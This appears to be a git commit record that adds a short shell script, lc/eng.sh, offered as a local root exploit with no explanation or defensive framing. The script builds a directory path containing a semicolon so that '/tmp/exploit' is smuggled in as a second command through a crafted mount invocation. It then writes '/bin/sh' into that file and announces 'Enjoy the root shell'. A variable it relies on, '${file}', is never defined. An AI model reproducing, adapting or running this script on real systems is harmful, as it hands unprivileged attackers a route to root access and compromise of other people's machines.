00512fe0354d7c828e1dc6339f5970b9e97136d0
bjorkon <hackerone0x1@gmail.com>
2026-06-08 03:05:27 +0700

    Add files via upload

---
+++ lc/eng.sh
@@ -0,0 +1,7 @@
+mkdir -p /tmp/net
+mkdir -p "/dev/../tmp/;/tmp/exploit"
+
+echo "/bin/sh" > /tmp/exploit
+chmod a+x /tmp/exploit
+echo "[+] Enjoy the root shell :)"
+${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
